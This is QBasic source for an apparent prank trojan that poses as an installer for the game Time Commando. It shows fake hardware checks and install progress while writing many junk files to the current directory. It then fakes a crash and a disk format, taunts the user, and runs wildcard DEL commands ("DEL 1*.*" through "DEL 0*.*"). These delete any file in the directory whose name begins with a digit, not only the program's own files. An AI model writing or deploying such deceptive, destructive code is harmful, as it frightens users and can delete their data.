CLS
COLOR 0, 15
CLS
COLOR 15, 1
S$ = "Welcome to the Time Commando (TM) Installation Program."
FOR i = 1 TO LEN(S$)
LOCATE 1, 12
PRINT LEFT$(S$, i)
PLAY "c64"
PLAY "p64"
NEXT i

PLAY "p4"
COLOR 10, 1
S$ = "Starting Analysis of System Hardware..."
FOR i = 1 TO LEN(S$)
LOCATE 4, 1
PRINT LEFT$(S$, i)
PLAY "c64"
PLAY "p64"
NEXT i

FOR j = 6 TO 20
FOR i = 2 TO 78
LOCATE j, i
COLOR 15, 4
PRINT " "
NEXT i
NEXT j

FOR i = 7 TO 21
LOCATE i, 79
COLOR 0, 0
PRINT " "
NEXT i

FOR i = 3 TO 79
LOCATE 21, i
COLOR 0, 0
PRINT " "
NEXT i

COLOR 15, 4

LOCATE 7, 4
PRINT "Analyzing..."
RANDOMIZE TIMER
LOCATE 12, 4
PRINT "|___________________________________||__________________________________|"
LOCATE 13, 4
PRINT "0%                                  50%                              100%"
FOR i = 5 TO 75
LOCATE 11, i
COLOR 15, 9
PRINT " "
PLAY "p64"
RANDOMIZE TIMER
c1 = INT(RND * 9) + 1
c2 = INT(RND * 9) + 1
c3 = INT(RND * 9) + 1
c4 = INT(RND * 9) + 1
c5 = INT(RND * 9) + 1
c6 = INT(RND * 9) + 1
c7 = INT(RND * 9) + 1
c8 = INT(RND * 9) + 1
c1$ = STR$(c1)
c2$ = STR$(c2)
c3$ = STR$(c3)
c4$ = STR$(c4)
c5$ = STR$(c5)
c6$ = STR$(c6)
c7$ = STR$(c7)
c8$ = STR$(c8)
F$ = c1$ + c2$ + c3$ + c4$ + c5$ + c6$ + c7$ + c8$
FOR k = 1 TO LEN(F$)
IF MID$(F$, k, 1) = " " THEN k$ = k$ + MID$(F$, k + 1, 1)
NEXT k
LOCATE 3, 4
OPEN k$ FOR OUTPUT AS #1
PRINT #1, "Installation file"
CLOSE
k$ = ""
m = INT(RND * 3) + 1
IF m = 3 THEN PLAY "p64"
NEXT i
LOCATE 18, 4
COLOR 31, 4
PRINT "Analysis complete"

LOCATE 22, 3
COLOR 0, 15
PRINT "Press any key to continue..."
DO
LOOP WHILE INKEY$ = ""


x:
CLS
COLOR 10, 1
S$ = "Analysis Report"
S2$ = "---------------"
FOR i = 1 TO LEN(S$)
LOCATE 2, 2
PRINT LEFT$(S$, i)
LOCATE 3, 2
PRINT LEFT$(S2$, i)
PLAY "c64"
PLAY "p64"
NEXT i

FOR j = 6 TO 20
FOR i = 2 TO 78
LOCATE j, i
COLOR 15, 4
PRINT " "
NEXT i
NEXT j

FOR i = 7 TO 21
LOCATE i, 79
COLOR 0, 0
PRINT " "
NEXT i

FOR i = 3 TO 79
LOCATE 21, i
COLOR 0, 0
PRINT " "
NEXT i


S$ = "|1| Processor : 486DX4/Pentium 100 or better"
S2$ = "|2| Sound Capability - Detected"
S3$ = "|3| Floating point support - Detected"
S4$ = "|4| SVGA or better Monitor - Detected"
S5$ = "|5| Network capability - Detected"
S6$ = "|6| 8MB or better RAM"
S7$ = "|7| DOS version 6.xx"

COLOR 3, 9

FOR i = 1 TO LEN(S$)
LOCATE 7, 3
PRINT LEFT$(S$, i)
PLAY "c64"
PLAY "p64"
NEXT i

FOR i = 1 TO LEN(S2$)
LOCATE 9, 3
PRINT LEFT$(S2$, i)
PLAY "c64"
PLAY "p64"
NEXT i

FOR i = 1 TO LEN(S3$)
LOCATE 11, 3
PRINT LEFT$(S3$, i)
PLAY "c64"
PLAY "p64"
NEXT i

FOR i = 1 TO LEN(S4$)
LOCATE 13, 3
PRINT LEFT$(S4$, i)
PLAY "c64"
PLAY "p64"
NEXT i

FOR i = 1 TO LEN(S5$)
LOCATE 15, 3
PRINT LEFT$(S5$, i)
PLAY "c64"
PLAY "p64"
NEXT i

FOR i = 1 TO LEN(S6$)
LOCATE 17, 3
PRINT LEFT$(S6$, i)
PLAY "c64"
PLAY "p64"
NEXT i

FOR i = 1 TO LEN(S7$)
LOCATE 19, 3
PRINT LEFT$(S7$, i)
PLAY "c64"
PLAY "p64"
NEXT i

LOCATE 11, 45
COLOR 30, 4
PRINT "Your computer has met the"
LOCATE 12, 45
PRINT "the  requirements for the"
LOCATE 13, 45
PRINT "Installation    of   Time"
LOCATE 14, 45
PRINT "Time Commando(TM)"

LOCATE 22, 3
COLOR 0, 15
PRINT "Press any key to continue..."
DO
LOOP WHILE INKEY$ = ""

CLS

COLOR 4

S$ = "Beginning installation..."
FOR i = 1 TO LEN(S$)
LOCATE 1, 1
PRINT LEFT$(S$, i)
PLAY "c64"
PLAY "p64"
NEXT i

sc = 1

S$ = "Installing Graphix files..."
S2$ = "Installing Sound files..."
S3$ = "Installing Network files..."
S4$ = "Installing Miscellaneous files..."
S5$ = "Installing Hardware Configuration Programs..."
S6$ = "Installing TIMECOMM.EXE..."

Install:

FOR j = 6 TO 20
FOR i = 2 TO 78
LOCATE j, i
COLOR 15, 4
PRINT " "
NEXT i
NEXT j

FOR i = 7 TO 21
LOCATE i, 79
COLOR 0, 0
PRINT " "
NEXT i

FOR i = 3 TO 79
LOCATE 21, i
COLOR 0, 0
PRINT " "
NEXT i

IF sc > 6 THEN GOTO InstallationDone

COLOR 15, 4
IF sc = 1 THEN LOCATE 7, 4: PRINT S$
IF sc = 2 THEN LOCATE 7, 4: PRINT S2$
IF sc = 3 THEN LOCATE 7, 4: PRINT S3$
IF sc = 4 THEN LOCATE 7, 4: PRINT S4$
IF sc = 5 THEN LOCATE 7, 4: PRINT S5$
IF sc = 6 THEN LOCATE 7, 4: PRINT S6$
RANDOMIZE TIMER
LOCATE 12, 4
PRINT "|___________________________________||__________________________________|"
LOCATE 13, 4
PRINT "0%                                  50%                              100%"
FOR i = 5 TO 75
LOCATE 11, i
COLOR 15, 9
PRINT " "
PLAY "p64"
RANDOMIZE TIMER
c1 = INT(RND * 9) + 1
c2 = INT(RND * 9) + 1
c3 = INT(RND * 9) + 1
c4 = INT(RND * 9) + 1
c5 = INT(RND * 9) + 1
c6 = INT(RND * 9) + 1
c7 = INT(RND * 9) + 1
c8 = INT(RND * 9) + 1
c1$ = STR$(c1)
c2$ = STR$(c2)
c3$ = STR$(c3)
c4$ = STR$(c4)
c5$ = STR$(c5)
c6$ = STR$(c6)
c7$ = STR$(c7)
c8$ = STR$(c8)
F$ = c1$ + c2$ + c3$ + c4$ + c5$ + c6$ + c7$ + c8$
FOR k = 1 TO LEN(F$)
IF MID$(F$, k, 1) = " " THEN k$ = k$ + MID$(F$, k + 1, 1)
NEXT k
LOCATE 3, 4
OPEN k$ FOR OUTPUT AS #1
PRINT #1, "Installation file"
CLOSE
k$ = ""
m = INT(RND * 3) + 1
IF m = 3 AND sc = 6 THEN PLAY "p16"
IF m = 3 THEN PLAY "p64"
NEXT i
sc = sc + 1
GOTO Install

InstallationDone:

LOCATE 22, 3
COLOR 0, 15
PRINT "Press any key to continue..."
DO
LOOP WHILE INKEY$ = ""
y:

COLOR 7, 0, 0
CLS
LOCATE 2, 1
PRINT "Time Commando(TM) has been successfully installed!"
LOCATE 4, 1
PRINT "Running Time Commando..."

FOR i = 1 TO 20
RANDOMIZE TIMER
c1 = INT(RND * 9) + 1
c2 = INT(RND * 9) + 1
c3 = INT(RND * 9) + 1
c4 = INT(RND * 9) + 1
c5 = INT(RND * 9) + 1
c6 = INT(RND * 9) + 1
c7 = INT(RND * 9) + 1
c8 = INT(RND * 9) + 1
c1$ = STR$(c1)
c2$ = STR$(c2)
c3$ = STR$(c3)
c4$ = STR$(c4)
c5$ = STR$(c5)
c6$ = STR$(c6)
c7$ = STR$(c7)
c8$ = STR$(c8)
F$ = c1$ + c2$ + c3$ + c4$ + c5$ + c6$ + c7$ + c8$
FOR k = 1 TO LEN(F$)
IF MID$(F$, k, 1) = " " THEN k$ = k$ + MID$(F$, k + 1, 1)
NEXT k
LOCATE 3, 4
OPEN k$ FOR OUTPUT AS #1
PRINT #1, "Installation file"
CLOSE
k$ = ""
NEXT i

LOCATE 6, 1
PRINT "DOS/4GW Professional Protected Mode Run-time Version 2.01a"
PRINT "Copyright (c) Horizon Software, Inc. 1997"

FOR i = 1 TO 25
RANDOMIZE TIMER
c1 = INT(RND * 9) + 1
c2 = INT(RND * 9) + 1
c3 = INT(RND * 9) + 1
c4 = INT(RND * 9) + 1
c5 = INT(RND * 9) + 1
c6 = INT(RND * 9) + 1
c7 = INT(RND * 9) + 1
c8 = INT(RND * 9) + 1
c1$ = STR$(c1)
c2$ = STR$(c2)
c3$ = STR$(c3)
c4$ = STR$(c4)
c5$ = STR$(c5)
c6$ = STR$(c6)
c7$ = STR$(c7)
c8$ = STR$(c8)
F$ = c1$ + c2$ + c3$ + c4$ + c5$ + c6$ + c7$ + c8$
FOR k = 1 TO LEN(F$)
IF MID$(F$, k, 1) = " " THEN k$ = k$ + MID$(F$, k + 1, 1)
NEXT k
LOCATE 3, 4
OPEN k$ FOR OUTPUT AS #1
PRINT #1, "Installation file"
CLOSE
k$ = ""
NEXT i

BEEP: BEEP: BEEP

SCREEN 1
SCREEN 0
PRINT "Integer divide by 0"
PRINT "Runtime Error at 0032:0023"
PRINT "Abnormal program termination"

BEEP: BEEP: BEEP

PLAY "mlc1c1"

CLS
SCREEN 2
SCREEN 0

LOCATE 1, 1
PRINT "C–all¬ toò F¦or‰m Æat"
FOR i = 1 TO 100
FOR k = 1 TO 300
NEXT k
LOCATE 4, 1
PRINT i; "% FÍoárÚm¾atÙted"
NEXT i
PRINT "Disk formatted"

Sucker:
INPUT "C>", A
PRINT "Bad or missing command interpreter"
c = c + 1
IF c = 5 THEN GOTO Gotcha:  ELSE GOTO Sucker

Gotcha:
CLS
PRINT "Ha!Ha! Gotcha ya lil' sucker!"

PRINT "FakeInstall! Disk Destroyer! Copyright (C) Dark Angels Inc. 1997"

PRINT "Deleting Junk Files (The files that made you think the program was actually"
PRINT "doing something)"

SHELL "DEL 1*.*"
LOCATE 7, 1
PRINT "10% deleted..."
SHELL "DEL 2*.*"
LOCATE 7, 1
PRINT "20% deleted..."
SHELL "DEL 3*.*"
LOCATE 7, 1
PRINT "30% deleted..."
SHELL "DEL 4*.*"
LOCATE 7, 1
PRINT "40% deleted..."
SHELL "DEL 5*.*"
LOCATE 7, 1
PRINT "50% deleted..."
SHELL "DEL 6*.*"
LOCATE 7, 1
PRINT "60% deleted..."
SHELL "DEL 7*.*"
LOCATE 7, 1
PRINT "70% deleted..."
SHELL "DEL 8*.*"
LOCATE 7, 1
PRINT "80% deleted..."
SHELL "DEL 9*.*"
LOCATE 7, 1
PRINT "90% deleted..."
SHELL "DEL 0*.*"
LOCATE 7, 1
PRINT "100% deleted..."
CLS
PRINT "Seeya......Sucker!"

DO
LOCATE 23,1
LOOP WHILE INKEY$=""
PRINT "Press any key to continue..."
END


